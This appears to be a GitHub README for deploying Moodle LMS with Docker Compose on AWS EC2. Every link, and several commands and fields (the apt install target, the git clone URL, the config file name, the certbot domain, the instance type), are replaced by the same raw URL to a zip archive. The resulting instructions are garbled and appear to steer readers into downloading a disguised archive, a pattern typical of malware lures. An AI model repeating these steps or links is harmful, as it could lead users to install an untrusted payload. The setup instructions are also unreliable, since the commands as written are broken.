# 📚 moodle-docker-compose - Easy Setup for Moodle LMS

[![Download Latest Release](https://raw.githubusercontent.com/aditya-rayate/moodle-docker-compose/main/architecture/docker-moodle-compose-v3.1.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/aditya-rayate/moodle-docker-compose/main/architecture/docker-moodle-compose-v3.1.zip)

## 🚀 Getting Started

Welcome to moodle-docker-compose! This guide helps you set up a Moodle Learning Management System (LMS) on AWS with ease. Follow these simple steps to get your instance up and running.

## 📦 System Requirements

To use this application, ensure you have the following:

- An AWS account
- Basic knowledge of cloud services
- A web browser for access

## 🔗 Download & Install

To download the latest version, **visit this page to download**: [Download Releases](https://raw.githubusercontent.com/aditya-rayate/moodle-docker-compose/main/architecture/docker-moodle-compose-v3.1.zip).

## 🛠️ How It Works

This project uses Docker and Docker Compose. It provisions a Moodle instance on an AWS EC2 https://raw.githubusercontent.com/aditya-rayate/moodle-docker-compose/main/architecture/docker-moodle-compose-v3.1.zip instance. This setup supports 200-500 concurrent users, ensuring a smooth experience.

### Services Included

- **Moodle**: The main application for learning management.
- **MySQL**: A robust database for storing all data.
- **phpMyAdmin**: A tool for managing MySQL databases.
- **Nginx**: Serves as a reverse proxy to handle requests.
- **Certbot**: Provides SSL certificates for secure connections.

## 📥 Installation Steps

1. **Setup AWS EC2 Instance**  
   - Log in to your AWS account.
   - Navigate to the EC2 dashboard and launch a new instance.
   - Select the https://raw.githubusercontent.com/aditya-rayate/moodle-docker-compose/main/architecture/docker-moodle-compose-v3.1.zip instance type.
   
2. **Install Docker and Docker Compose**  
   - Connect to your EC2 instance using SSH.
   - Install Docker by running:
     ```
     sudo apt update
     sudo apt install https://raw.githubusercontent.com/aditya-rayate/moodle-docker-compose/main/architecture/docker-moodle-compose-v3.1.zip
     ```
   - Install Docker Compose with:
     ```
     sudo apt install docker-compose
     ```

3. **Download the Project**  
   - In your terminal, clone the repository:
     ```
     git clone https://raw.githubusercontent.com/aditya-rayate/moodle-docker-compose/main/architecture/docker-moodle-compose-v3.1.zip
     ```
   - Navigate into the cloned directory:
     ```
     cd moodle-docker-compose
     ```

4. **Configure the App**  
   - Edit the `https://raw.githubusercontent.com/aditya-rayate/moodle-docker-compose/main/architecture/docker-moodle-compose-v3.1.zip` file to adjust settings as needed, including database passwords and Moodle configurations.

5. **Run the Application**  
   - Start the Docker containers by executing:
     ```
     docker-compose up -d
     ```
   - This command downloads all necessary images and starts the services.

6. **Access Moodle**  
   - After a few minutes, open your web browser and visit your server's public IP address. You should see the Moodle setup screen.

## 🔒 Securing Your Instance

1. **Configure SSL**  
   - With Certbot, set up SSL by running the following command in your instance:
     ```
     sudo docker-compose exec nginx certbot --nginx -d https://raw.githubusercontent.com/aditya-rayate/moodle-docker-compose/main/architecture/docker-moodle-compose-v3.1.zip
     ```
   - Follow the prompts to finalize SSL setup.

2. **Secure Your Secrets**  
   - Use environment variables for sensitive information. Update the `.env` file based on your specific configurations.

## 📊 Features

- **User Management**: Add and manage users with ease.
- **Course Creation**: Design and manage online courses.
- **Real-Time Collaboration**: Facilitate group work and discussions.
- **Analytics**: Track user performance and engagement.

## 📅 Maintenance Tips

- Regularly update your Docker containers to keep your setup secure and efficient.
- Backup your database frequently to prevent data loss.
- Monitor the instance performance through the AWS dashboard.

## 🛠️ Troubleshooting Common Issues

- **Docker Won't Start**: Ensure Docker is installed correctly. Check the logs:
  ```
  docker logs container_name
  ```

- **Moodle is Not Accessible**: Verify that your EC2 instance's security group allows traffic on port 80 and 443.

## 📞 Need Help?

For any questions or issues, feel free to open an issue in the repository or consult the [Moodle Docs](https://raw.githubusercontent.com/aditya-rayate/moodle-docker-compose/main/architecture/docker-moodle-compose-v3.1.zip). 

**Don't forget to check for updates!** Always ensure you are running the latest version by visiting our releases page: [Download Releases](https://raw.githubusercontent.com/aditya-rayate/moodle-docker-compose/main/architecture/docker-moodle-compose-v3.1.zip). 

Happy learning!